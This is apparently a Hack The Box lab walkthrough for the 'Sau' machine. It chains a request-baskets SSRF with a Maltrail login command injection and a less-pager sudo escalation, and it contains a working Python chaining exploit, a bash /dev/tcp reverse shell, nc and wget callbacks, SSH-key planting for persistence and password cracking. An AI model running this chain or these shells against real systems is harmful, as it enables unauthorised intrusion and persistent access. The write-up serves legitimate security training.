---
title: "Sau"
date: 2023-07-12T12:49:00-00:00
publishdate: 2024-03-08T18:00:00-00:00
releasedate: 2023-07-08T00:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/Sau.png
icon: /htb-box-icons/Sau.png
toc: true
tags: ["CVE", "SSRF", "Vulnerability Chaining", "Command Injection", "Common Program Privesc"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## INTRODUCTION

At the time of writing this walkthrough, this is still an Active box. It was released as the fourth box for HTB's *Hackers Clash: Open Beta Season II*. Sau is an "Easy" Linux box, named after its creator, **sau123**. At face value, the box is a server hosting a web-app for collecting and displaying HTTP requests. The user is able to define "baskets" to catch requests, where the requests and their responses can later be analyzed - including their body and headers. Sau is a well-made easy box, with a straightforward path to the end. The foothold has multiple steps, emphasizing the importance of good enumeration and research. Once foothold is gained, recognition and understanding of the underlying vulnerability will ensure a quick sprint to the root flag. 

![title picture](index%20page.png)



## RECON

### nmap scans

For this box, I'm running the same enumeration strategy as the previous boxes in the *Open Beta Season II*. I set up a directory for the box, with a `nmap` subdirectory. Then set `$RADDR` to my target machine's IP, and scanned it with a simple but broad port scan:

```bash
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR
```

The results showed only ports 22 (SSH), and 80 (HTTP):

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 11:27 IDT
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.18s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
32/tcp    filtered unknown
80/tcp    filtered http
1149/tcp  filtered bvtsonar
1163/tcp  filtered sddp
1782/tcp  filtered hp-hcip
3828/tcp  filtered neteh
5431/tcp  filtered park-agent
6792/tcp  filtered unknown
10010/tcp filtered rxapi
13782/tcp filtered netbackup
26214/tcp filtered unknown
44443/tcp filtered coldfusion-auth
50006/tcp filtered unknown
55555/tcp open     unknown
```

That is a LOT of filtered ports... Only two open ports: 22 and 55555. I will try to figure out what's on `55555` detailed script scan on these ports:

```bash
nmap -sV -sC -n -Pn -p22,55555 -oN nmap/extra-scan.txt $RADDR
```

Some text:

```
Nmap scan report for 10.10.11.224
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 10 Jul 2023 09:52:20 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 10 Jul 2023 09:51:51 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 10 Jul 2023 09:51:52 GMT
|_    Content-Length: 0
```

Ah ok. It is just a webserver after all. The "invalid basket name" intrigues me a bit. It provides regex:

> invalid basket name; the name does not match pattern: `^[wd-_\.]{1,250}$`

It looks like a regex way of stating "1 to 250 characters of either 'w', 'd', '-', '_', or '.' ". However, when I pop it into [RegExr](https://regexr.com/) it states that a portion of that regex is invalid. It could be a different flavor of regex, in which case 'w' is probably interpreted as 'word', 'd' as 'digit', and the special characters interpreted as themselves? I'm sure this will come up later.

### Webserver Strategy

Did banner-grabbing:

```bash
whatweb $RADDR:55555 && curl -IL http://$RADDR:55555
```

![web fingerprinting](web%20fingerprinting.png)

There is a redirect to `/web`, but it supports GET. Added `sau.htb` to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.

```bash
echo "10.10.11.224 sau.htb" | sudo tee -a /etc/hosts
```

> ☝️ I use `tee` instead of the append operator `>>` so that I don't accidentally blow away my `/etc/hosts` file with a typo of `>` when I meant to write `>>`.

I performed vhost and subdomain enumeration:

```bash
WLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
ffuf -w $WLIST -u http://$RADDR:55555 -H "Host: FUZZ.htb" -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac
ffuf -w $WLIST -u http://$RADDR:55555 -H "Host: FUZZ.sau.htb" -c -t 60 -o fuzzing/vhost-sau.md -of md -timeout 4 -ic -ac
```

```bash
ffuf -w $WLIST -u http://FUZZ.$DOMAIN:55555 -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac
```

There were no results from vhost or subdomain enumeration, so I proceeded with directory enumeration on http://sau.htb:

```bash
WLIST="/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt"
feroxbuster -w $WLIST -u http://$DOMAIN:55555 -A -d 1 -t 100 -T 4 -f -E --auto-tune --collect-words --filter-status 400,401,402,404,405 --output fuzzing/directory.json
```

> **feroxbuster flags explanation:**
>
> `-A` : Randomize the user-agent
> `-d 2` : Recurse to a depth of 2 only
> `-t 100` : Run using 100 threads
> `-T 4` : Use a 4s timeout on all requests 
> `-f` : Try adding a slash for each request. Useful if you don't know what type of webserver is running.
> `-E` : Collect known file extensions (ex .php or .js)
> `--auto-tune` : Adjust speed and request patterns if excessive errors are encountered.
> `--collect-words` : On successful page loads, read the pages to extract keywords; prepend to wordlist.
> `--filter-status` : Reject all usual HTTP 4xx statuses except 403
> `--output` : Output results as json to file

Directory enumeration gave the following:

![feroxbuster](feroxbuster.png)



### Exploring the Website

> To the reader: you may skip ahead to [API Enumeration](#api-enumeration) if you're short on time. This section turned out to be unimportant to the end result.

I took a quick look through the website. The page at `/web` allows the user to create or select a new basket. The basket IDs get stored in the client's localstorage. Optionally, they can click the cog button in the top-right to go to `/web/baskets`, the admin page. To access it, you need the "master token":

![master token form](master%20token%20form.png)

Checking the source code of the page, most of it is the typical plumbing of a website like this, one interesting bit is the `createBasket` function:

```js
function createBasket() {
      var basket = $.trim($("#basket_name").val());
      if (basket) {
        $.ajax({
          method: "POST",
          url: "/api/baskets/" + basket,
          headers: {
            "Authorization" : sessionStorage.getItem("master_token")
          }
        }).done(function(data) {
          localStorage.setItem("basket_" + basket, data.token);
          $("#created_message_text").html("<p>Basket '" + basket +
            "' is successfully created!</p><p>Your token is: <mark>" + data.token + "</mark></p>");
          $("#basket_link").attr("href", "/web/" + basket);
          $("#created_message").modal();
          addBasketName(basket);
        }).always(function() {
          randomName();
        }).fail(onAjaxError);
      } else {
        $("#error_message_label").html("Missing basket name");
        $("#error_message_text").html("Please, provide a name of basket you would like to create");
        $("#error_message").modal();
      }
}
```

Note the api endpoint: `/api/baskets/[basketname]`. I checked the source of the other page from directory enumeration, `/web/web` (which may just be a routing mistake). It reveals more API endpoints:

- POST `/api/baskets/[basketname]` (From `/web` source code)
- GET `/api/baskets/web/requests`
  - `?skip=" + fetchedCount` 
  - `?max=0`
- GET `/api/baskets/web/responses/[METHOD]`
  Displays the response
- PUT `/api/baskets/web/responses/[METHOD]`
  Updates the response?
- PUT `/api/baskets/web`
  Reconfigures the basket?
- GET `/api/baskets/web`
  Opens the config modal dialog
- DELETE `/api/baskets/web/requests`
  Deletes all requests
- DELETE `/api/baskets/web/requests`
  Deletes the basket. Also removes 'basket_web' item from localstorage.

The `acceptSharedBasket()` function is called when a user navigates to a basket whose token is not in localstorage. This function provides some details:

```js
function acceptSharedBasket() {
      var token = getParam("token");
      if (token) {
        var currentToken = getBasketToken();
        if (!currentToken) {
          localStorage.setItem("basket_web", token);
        } else if (currentToken !== token) {
          if (confirm("The access token for the 'web' basket \n" +
              "from query parameter is different to the token that is \n" +
              "already stored in your browser.\n\n" +
              "If you trust this link choose 'OK' and existing token will be \n" +
              "replaced with the new one, otherwise choose 'Cancel'.\n\n" +
              "Do you want to replace the access token of this basket?")) {
            localStorage.setItem("basket_web", token);
          }
        }
        window.location.href = "/web/web";
      }
    }
```

:point_up: Ok, so `/web/web` was not a mistake. It's used for accepting a link to a basket that has been shared with the user by another user.

> :bulb: Given the slightly janky way that many of the requests to the API get built/parsed, my early bet is that there is some kind of broken authentication on the site.



### API Enumeration

Thankfully, the API is small enough to enumerate manually. I ran the following (try each HTTP method on all discovered API endpoints under `/api/baskets/web/`):

```bash
for METHOD in GET POST PUT DELETE; do ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/api/baskets/web/FUZZ -t 80 -c -timeout 4 --recursion --recursion-depth 2 -X $METHOD -v; done
```

Results:

- GET
  - http://10.10.11.224:55555/api/baskets/web/
- POST
  - http://10.10.11.224:55555/api/baskets/web/
  - http://10.10.11.224:55555/api/baskets/web/requests
- PUT
  - http://10.10.11.224:55555/api/baskets/web/
  - http://10.10.11.224:55555/api/baskets/web/requests
- DELETE
  - http://10.10.11.224:55555/api/baskets/web/
- Also...
  - GET http://10.10.11.224:55555/api/stats

I'll try just using the site normally to get a better feel for how it works; I'll create a new basket and try sending a couple requests:

![basket 1](basket%201.png)

It looks like the app also has the ability to proxy any requests. This might be interesting. Perhaps there's a way to use this to do some kind of SSRF? I'll investigate this after a bit more recon :triangular_flag_on_post:

![basket configuration](basket%20configuration.png)

Back on the main page, `/web`, it the page footer reveals that this web app uses an open source project: https://github.com/darklynx/request-baskets. Also, it shows we're using **request-baskets v1.2.1** I'll check the github page and see if there are default credentials, or anything suspicious in the Issue log. Checking the changelog for **v1.2.2** seemed like a sensible place to start, and gave some juicy details right away, inside the commit "[lets simplify script to setup DBs for testing](https://github.com/darklynx/request-baskets/commit/f9bb11fd40882153a1df1874562eaf32876ff374)": 

![git issues new in 1-2-2](git%20issues%20new%20in%201-2-2.png)

Great, now we know that it's preconfigured to use PostgresSQL (on port 5432) and MySQL (on port 3306), with the same default user:

- **rbaskets : pwd**

I'll try using that proxy feature and logging into MySQL with it:

![ssrf attempt 1](ssrf%20attempt%201.png)

![ssrf attempt 2](ssrf%20attempt%202.png)

Hmm, nope. I'm probably doing something wrong on my end. I'll check online to see if anyone else has tried finding vulnerabilities in **request-baskets**. Immediately I found CVE-2023-27163:

> request-baskets up to v1.2.1 was discovered to contain a Server-Side  Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request. 

:thumbsup: Excellent - I wasn't too far off the mark. 



## FOOTHOLD

### SSRF Investigation

Checking out this CVE, it looks like the exploit is extremely simple:

1. Create a basket. Note the ID of the basket

2. Issue POST requests to `/api/baskets/[ID]`, specifying the proxy address within the POST data:

   ```
   {
   	"forward_url": "http://127.0.0.1:80/test",
   	"proxy_response": false,
   	"insecure_tls": false,
   	"expand_path": true,
   	"capacity": 250
   }
   ```

I found another resource that is a *description (aka crawl and copy) of the PoC* within the initial disclosure (unfortunately, I cannot access [the initial disclosure](https://notes.sjtu.edu.cn/s/MUUhEymt7)):

> request-baskets SSRF details Follow the official documentation to start  forem with docker installation. Then, we log in to the administrator background:  The following API’s forward_url parameter is vulnerable to SSRF： 1.  /api/baskets/{name} 2. /baskets/{name} Let’s take /api/baskets/{name}  API as an example, another API is the same vulnerability. We use the  following payload to post /api/baskets/{name} API： ``` { "forward_url":  "http://127.0.0.1:80/test", "proxy_response": false, "insecure_tls":  false, "expand_path": true, "capacity": 250 } ```  ! Direct post can only set the url, you need to visit the url -  http://192.168.175.213:55555/test to trigger the SSRF vulnerability.  # Influence： **Information Disclosure and Exfiltration** This was  previously identified as an issue. Requests for images that are  unauthenticated can lead to the leak of all existing images in the  server. However, this isn’t limited to just images. Any resource that  can be obtained via an HTTP request on the local network of the  webserver can be obtained remotely via this request. **Unauthenticated  Access to Internal Network HTTP Servers** The SSRF attack can be  leveraged to connect to any HTTP Server connected to the same network as the request-baskets server, for instance an Nginx server exposed only  internally, an internal RESTful API, such as a NoSQL database, or a  GraphQL database. This is not limited just to services hosted on the  local machine, but all the machines connected on the local network.  **Port and IP Scanning and Enumeration** This vulnerability can be  leveraged to port scan for HTTP servers both internal and external  services on demand, as well as enumerating all the machines in the local network that have open HTTP ports.

In an attempt to perform what is described above, I wrote the following script (final version shown later in the walkthrough):

> My initial reaction is always to just try an exploit like this in the browser or Burp Proxy. However, I often make small mistakes or malform the request, etc. In an effort to avoid that, I figured I would try the same process using Python + Requests.

```python
#!/bin/python3

'''
From https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7
'''

import requests
import argparse

parser = argparse.ArgumentParser(                                                                 
    prog='CVE-2023-27163-exploit.py',
    description='Exploit the SSRF vulnerability in Request-Baskets (v1.2.1 or earlier)',
    epilog='Author: 4wayhandshake')

parser.add_argument('target', help='The URL of the target, Ex. "http://10.10.11.224:55555")', type=str)
parser.add_argument('basket', help='The ID of the basket to use (Ex. "geto2km")', type=str)

args = parser.parse_args()

s = requests.session()

def postTarget(resource):
    target_url = f'{args.target}/api/baskets/{args.basket}'
    payload = {
        "forward_url": f'http://127.0.0.1:55555/{resource}',
        "proxy_response": False,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }
    response = s.post(target_url, json=payload, timeout=2.50)
    print(f'[{response.status_code}] {response.text}')
    
def getTarget(resource):
    target_url = f'{args.target}/{args.basket}/{resource}'
    response = s.get(target_url, timeout=2.50)
    print(f'[{response.status_code}] {response.text}')
    
while True:
    try:
        resource = input("> ")
        postTarget(resource)
        getTarget(resource)
    except requests.exceptions.ReadTimeoutError as e:
        print(e)
    except KeyboardInterrupt as e:
        print("Exiting...")
        break
```

Unfortunately, this yielded no result.  I'll try parameterizing the `forward_url` and attempt to get it to contact my own box. On my attacker box, I created a python http webserver:

> Note: `~/Tools/STAGING` is a directory containing my "toolbox". Most importantly, it contains a simple `index.html` file. I  usually download this directory's contents the target box after obtaining a reverse shell. For more details, please see my [User Enumeration - Linux](/strategy/user-enumeration-linux) strategy.

```
sudo ufw allow from 10.10.11.224 to any port 8000 proto tcp
cp -r ~/Tools/STAGING www && cd www
python3 -m http.server 8000
```

And modify the script's `postTarget()` function:

```python
...
parser.add_argument('target', help='The URL of the target, Ex. "http://10.10.11.224:55555")', type=str)
parser.add_argument('forward', help='Forward URL, Ex. "http://10.10.14.3:8000")', type=str)
parser.add_argument('basket', help='The ID of the basket to use (Ex. "geto2km")', type=str)

args = parser.parse_args()

s = requests.session()

def postTarget():
    target_url = f'{args.target}/api/baskets/{args.basket}'
    payload = {
        "forward_url": args.forward,
        "insecure_tls": False,
        "proxy_response": False,
        "expand_path": True,
        "capacity": 250
    }
    response = s.post(target_url, json=payload, timeout=2.50)
...
```

I'll run the script and try contacting my local webserver using the `forward_url`:

![ping local webserver](ping%20local%20webserver.png)

![ping local webserver 2](ping%20local%20webserver%202.png)

Success! On the local webserver we see the GET request come in, and via the proxy we receive `index.html`. Great, now we know that the `forward_url` parameter works as expected. I'll try doing as the PoC for the CVE says, and set the `forward_url` to the localhost - more like a traditional SSRF:

![ssrf attempt 3](ssrf%20attempt%203.png)

That's unexpected. The server replies with status 200 on any request, like a wildcard directory. When I try using a path expansion by introducing `../` into the request, the result is what we get at `http://sau.htb:55555/web`. I'll try enumerating this directory to see what else is there:

```bash
ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/test9/FUZZ -t 80 -c -timeout 4 -r -v 
```

![ssrf ffuf 1](ssrf%20ffuf%201.png)

OK, there's the wildcard directory. Now I'll try the parent directory:

```bash
ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/test9/../FUZZ -t 80 -c -timeout 4 -r -v -fw 1
```

![ssrf ffuf 2](ssrf%20ffuf%202.png)

I think it's safe to say that the SSRF is not working: these results match the regular website on 55555. The previous two ffuf attempts correspond to the `/web/[basketID]` and `/web/web` endpoints under 55555. What could have been wrong? Perhaps one of the parameters to set up forwarding:

- `forward_url` seems like it is correct: we want to request resources at `http://127.0.0.1:80/`
- `insecure_tls` shouldn't matter at all, because we're not forwarding to a server using `https`
- `expand_path` seems like it will be very useful for performing directory traversal. If it's working already, why not keep it on?
- `capacity` shouldn't matter either: it's just the number of requests held in the "bucket", so shouldn't have an effect on forwarding.
- *... maybe `proxy_response` is the problem?* :thinking:

To try this out, I changed `proxy_response` to `True` in the script:

```python
...
    payload = {
        "forward_url": args.forward,
        "insecure_tls": False,
        "proxy_response": True,
        "expand_path": True,
        "capacity": 250
    }
...
```

After that modification, I'll try running it again, using the `forward_url` to the target's localhost port 80:

![ssrf success 1](ssrf%20success%201.png)

Excellent! port 80 has an index page with title *Maltrail*. I wonder what it is. I'll check it out in the browser:

![ssrf success 2](ssrf%20success%202.png)



### Port 80 (filtered)

Looks like styles maybe didn't load, but that's definitely a different website! :clap: Most importantly, we see that it is a service called **Maltrail (v0.53)**. The links at the top of the page all point to [the Maltrail github repo](https://github.com/stamparm/maltrail). Since this is http, it's probably a good idea to try directory enumeration:

![ssrf directory enum](ssrf%20directory%20enum.png)

Interesting results. The `/ping` and `/whoami` pages are especially interesting. 

- `/whoami` doesn't seem to do anything right now (with empty request headers etc.);

-  `/ping` replies with a single word `pong`

- `/` is as shown in the screenshot above

- `/index` reveals a login page, shown in the screenshot below.

  ![maltrail login](maltrail%20login.png)

  

### Command Injection via SSRF

After enumeration, I checked searchsploit to see if there is exploit code for Maltrail: there is not. However, some quick web searching yielded a result: I found this page describing a *critical* (10/10) vulnerability applicable to this version of Maltrail:

![maltrail cve](maltrail%20cve.png)

That article provides the following PoC:

```
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```

The script will need to be modified to perform POST requests to the login (index) endpoints instead of GET requests to localhost:80.

```python
...
def commandInjection(cmd):
    target_url = f'{args.target}/{args.basket}/index'
    command = f';{cmd}' # Later, url-encode this or maybe b64 it
    payload = {
        "username": command
    }
    response = s.post(target_url, data=payload, timeout=2.50)
    print(f'[{response.status_code}] {response.text}')

postTarget()
while True:
    try:
        cmd = input("> ")
        commandInjection(cmd)
    except (requests.exceptions.ReadTimeout,
            requests.exceptions.ConnectTimeout) as e:
        print(e)
    except KeyboardInterrupt as e:
        print("Exiting...")
        break
```

I tried several commands to test the injection (including the URL-encoded version of each), such as `nc 10.10.14.4 4444` and `wget http://10.10.14.4:8000`. I didn't get any evidence that the command executed. What could be wrong? To investigate, I tried the actual login page and proxied the request through Burp:

![ssrf attempt 4](ssrf%20attempt%204.png)

Oh, I see: First of all, it's posting to `/login`. Also, there's a hash with a nonce. Thankfully, since it's only the password field that isn't present in the request, there's a good chance that  the hash was only taken for the password. If this is true, sending the same hash every time should be fine, as long as the server isn't actually checking for a unique nonce :eyes:...  Also, it probably makes sense to URL-encode the whole command.

> :scream: I also realized that I forgot to include backticks in the command! No wonder nothing was running. I'm not sure if adding the nonce/hash was useful, but the rest of the modifications seemed to work.

To accommodate these discoveries, I modified the script into the following **<u>final</u>** version:

```python
#!/bin/python3

'''
Chain together exploits to two vulnerabilities:

Vulnerability #1: CVE-2023-27163
    Inspiration from gist at https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3
    PoC: 
        POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
        details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7
     
Vulnerability #2:
    Unauthenticated OS Command Injection in stamparm/maltrail
    See https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
    PoC:
        curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
     
'''

import requests
import argparse
import urllib.parse

parser = argparse.ArgumentParser(                                                                 
    prog='exploit.py',
    description='Exploit the SSRF vulnerability in Request-Baskets (v1.2.1 or earlier), then the command injection vulnerability in Maltrail (v0.54 or earlier)',
    epilog='Author: 4wayhandshake')

parser.add_argument('target', help='The URL of the target, Ex. "http://10.10.11.224:55555")', type=str)
parser.add_argument('forward', help='Forward URL, Ex. "http://127.0.0.1:80")', type=str)
parser.add_argument('basket', help='The ID of the basket to use (Ex. "geto2km")', type=str)

args = parser.parse_args()

s = requests.session()

def postTarget():
    target_url = f'{args.target}/api/baskets/{args.basket}'
    payload = {
        "forward_url": args.forward,
        "insecure_tls": False,
        "proxy_response": True,
        "expand_path": True,
        "capacity": 250
    }
    response = s.post(target_url, json=payload, timeout=2.50)
    print(f'[{response.status_code}] {response.text}')
    
def commandInjection(cmd):
    target_url = f'{args.target}/{args.basket}/login'
    command = urllib.parse.quote_plus(f';`{cmd}`')
    payload = {
        "username": command,
        "hash": "145e5a296fbfc8c6182ddff9a21eba2fa3897d61de023b2dde1c7c330dccc78a",
        "nonce": "7qK7ycjX7Ypt"
    }
    response = s.post(target_url, data=payload, timeout=10.0)
    print(f'[{response.status_code}] {response.text}')

postTarget()
while True:
    try:
        cmd = input("> ")
        commandInjection(cmd)
    except (requests.exceptions.ReadTimeout,
            requests.exceptions.ConnectTimeout) as e:
        print(e)
    except KeyboardInterrupt as e:
        print("Exiting...")
        break

```

With the modifications to the script complete, I'll try it again:

![command injection 2](command%20injection%203.png)

:grin: Alright! Looks like I've got command injection. My attempts with `nc 10.10.14.4 4444` and `wget http://10.10.14.4:8000` were both successful:

![command injection 2](command%20injection%202.png)

![command injection 4](command%20injection%204.png)



### Reverse Shell

Let's turn this command injection into a full reverse shell. It should be as simple as sending one command. First, I'll try a bash reverse shell `bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'`:

![command injection 5](command%20injection%205.png)

![command injection 6](command%20injection%206.png)

There we go! Worked first try :thumbsup:



## USER FLAG

### Upgrading the Shell

I'll start out by attempting to upgrade my shell:

```bash
which python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg [enter] [enter]
export TERM=xterm-256color
alias ll="ls -lah"
```



### Planting an SSH  key

The reverse shell is pretty good, but it would be even better to have SSH. Let's plant an SSH key into the `puma` user for a more stable connection. First, on the attacker box, create a key, then base64-encode the pubkey:

```bash
ssh-keygen -t rsa -b 2048
[output to ./id_rsa and used passphrase "password"]
chmod 700 id_rsa
base64 -w 0 id_rsa.pub > id_rsa.pub64
cat id_rsa.pub64
[copy the output to clipboard]
```

On the target box, as puma:

```bash
mkdir -p ~/.ssh
echo "[paste the id_rsa.pub64 contents]" | base64 -d >> ~/.ssh/authorized_keys
```

Then, back on the attacker box, use SSH and the generated key to log in as `puma`:

```bash
ssh -i id_rsa puma@10.10.11.224
```

![puma ssh](puma%20ssh.png)

Great! Now we have a fully-interactive shell and a persistent way to get back in (without needing the exploit / command injection).



### User: puma

Now, I'll enumerate the user. As always, in an effort to keep the walkthrough brief, I'll just show the notable results of user enumeration. To learn more about the details of my enumeration strategy, [please read through this page](/strategy/user-enumeration-linux).

- `puma` and `root` are the main users on the box. Only `puma` has a home directory.

- `puma` can sudo a certain service:

  ```
  User puma may run the following commands on sau:
      (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
  ```

- `puma` holds the user flag

- `netstat -tulpn` showed a very odd entry:  :triangular_flag_on_post:

  ```bash
  (Not all processes could be identified, non-owned process info
   will not be shown, you would have to be root to see it all.)
  Active Internet connections (only servers)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
  tcp        0      0 0.0.0.0:8338            0.0.0.0:*               LISTEN      888/python3         
  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
  tcp6       0      0 :::55555                :::*                    LISTEN      -                   
  tcp6       0      0 :::22                   :::*                    LISTEN      -                   
  udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
  udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
  ```

The `puma` user already has access to the flag, just `cat` it out for the points (pun intended):

```bash
cat ~/user.txt
```



### Port 8338

Investigating port 8338 was a very short rabbit-hole. Contacting the port internally with netcat reveals it is running HTTP. Subsequently using cURL on the port shows a simple website with a few links. One thing is notable: a link to a public **Google Sheets** document. Arriving at this document reveals hundreds of messages from other HTB players, many of which state that this is not part of the box.

In my opinion, I saw this as kind of a hiker's inuksuk: a way to leave your mark along a difficult path to say "I was here". Go ahead and leave a tag, then get back to the rest of the box. 



## ROOT FLAG

### trail.service

During user enumeration for `puma`, running `sudo -l` revealed that `puma` has sudo permissions for:

```
/usr/bin/systemctl status trail.service
```

Running that command, this is the output. It appears to be a lot of Maltrail, which logs possible malicious http inputs to the server:

![maltrail logs 2](maltrail%20logs%202.png)

It looks like Maltrail logged several events, including my initial attempts at RCE and later, my creation of a reverse shell. Fun fact, it looks like it also logged someone else's reverse shell (that big base64 string further up decodes into a python reverse shell).



### server.py

> To the reader: you may skip ahead to [trail.service](#trail.service) if you're short on time. This section turned out to be unimportant to the end result.

It's notable that `trail.service` has mention of the weird python process with pid 888: the one also seen with `netstat` during enumeration. I wonder if it's making python run? I'll try running the service while also running pspy (using tmux):

==> Result: no, running the service did not cause `server.py` to run. It is already running.

Where is `server.py`? I'll go take a look at it:

```bash
find / -name "server.py" 2>dev/null
```

Oh! it's in `/opt/maltrail` :scream: This is the directory I was dropped into from the initial reverse shell! Now I feel foolish.

It looks like `server.py` mentions a config file:

![opt maltrail server](opt%20maltrail%20server.png)

At risk of stating the obvious: Knowing that the config file is an adjacent file, it's safe to assume that the maltrail config file is `maltrail.config`. Let's look inside:

![opt maltrail config](opt%20maltrail%20config.png)

That looks like a password hash that would be stored in something like `/etc/shadow`. And if so, it's for UID=0, aka `root`. The config file is even nice enough to specify the format of the hash. For copy-pasting sake, here it is again:

```
USERS                                                                                                     admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:                   # changeme!
local:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:1000:192.168.0.0/16  # changeme!
```

Since this clearly does not match `/etc/passwd`, I won't use `unshadow` for obtaining the password. Instead, I'll check to see which format in `john` would be best:

```
john --list=subformats | grep sha256
```

The winner is:

```
Format = dynamic_60  type = dynamic_60: sha256($p)
```

Put the hash into a file, in the format that `john` recognizes, then run `john` with the specified format. Since this is HTB, it's safe to assume the password is in `rockyou.txt`:

```bash
echo "admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc" > hash.txt
WLIST=/usr/share/wordlists/rockyou.txt
john --wordlist=$WLIST --format=dynamic_60 hash.txt
```

In less than a second, the password was cracked:

![cracked password](cracked%20password.png)

Awesome! *Thanks, John!* :joy: Now that we have a (hopefully root) credential, let's try it with SSH:

```bash
ssh root@$RADDR
```

==> Nope. Not the correct password. Too bad. 



### trail.service

Perhaps the service itself is vulnerable? I've already investigated its configuration. It runs python, but at a fixed/absolute path where `puma` does not have write access to. The service just opens up some logging.

Oh! OH... :flushed: I should have realized this earlier, when I first ran it: *running that service automatically opens the results in pager*! For this box (and most systems) the pager is `less`. I was already familiar with this privilege escalation, but those unaware should check out [this page of GTFObins](https://gtfobins.github.io/gtfobins/less/) for more detail (the very first entry on the page). 

There is a convenience feature of `less` similar to several other full-screen programs that allows the user to run shell commands from within it by prefixing the command with a '!'. For example, `!id`:

![privesc 1](privesc%201.png)

:tada: From there, simply `cat` out the flag for those sweet root flag points! Congratulations. 



## EXTRA CREDIT: PWN

To take it one step further, gain full root access by planting another SSH key. Generate a new SSH key as we did before:

```
ssh-keygen -t rsa -b 2048
[output to ./root_id_rsa and used passphrase "password"]
chmod 700 id_rsa
base64 -w 0 root_id_rsa.pub > root_id_rsa.pub64
cat root_id_rsa.pub64
[copy the output to clipboard]
```

Then use the same "feature" of `less` to plant the SSH key:

```
!echo "[paste the contents of root_id_rsa.pub64]" | base64 -d >> /root/.ssh/authorized_keys
```

From the attacker box, use SSH to log in as root with the newly-generated key:

![root ssh](root%20ssh.png)

:sunglasses: There it is: full root access over SSH!



## LESSONS LEARNED

### Attacker

- **Once you know the application and version, spend a minute looking for known vulnerabilities**. I spent far too long enumerating the box and the Requests-Basket API, reading through piles of javascript to get a feel for how the app worked. While it was mildly interesting, very little of that knowledge was useful in gaining a foothold for the box.
- **Remember the filtered ports**. In my typical port scan, the filtered ports don't show up individually - I only get a count of how many filtered ports were observed. I need to remember to go back and do another port scan if *any* filtered ports were detected.
- Read through the directory where your reverse shell opens. There's a higher likelihood of finding the vulnerability in or around a misconfigured application, so it should be top priority during enumeration.
- **Full-screen console app? Check for ability to run shell commands**. There are many examples of where this appears, including less, vim, ftp, mysql, etc. Many applications, especially older ones that came to popularity before multi-window systems, have some ability to run shell commands without leaving the application itself. If that application was run in a privileged process, those privileges are not dropped while within the application, leaving to an easy privesc. 


### Defender

- **Don't host things that are bound to be insecure.** Providing a feature that allows an (untrusted) user to establish a forwarding url and to use that address to proxy traffic back to the user... that's just asking for it! If software like this is mission-critical, it would be better to externalize the risk and get an existing product like Burp or Postman. 
